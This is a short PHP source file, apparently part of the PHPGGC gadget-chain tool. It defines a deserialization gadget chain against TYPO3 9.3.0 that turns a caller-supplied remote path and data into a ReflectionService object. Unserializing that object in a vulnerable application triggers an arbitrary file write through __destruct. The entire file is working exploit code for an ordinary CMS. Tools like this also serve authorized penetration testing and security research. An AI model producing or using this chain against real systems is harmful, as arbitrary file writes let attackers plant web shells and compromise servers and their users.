<?php

namespace GadgetChain\Typo3;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '9.3.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
    	$data = $parameters['data'];

        return new \TYPO3\CMS\Extbase\Reflection\ReflectionService($path, $data);
    }
}
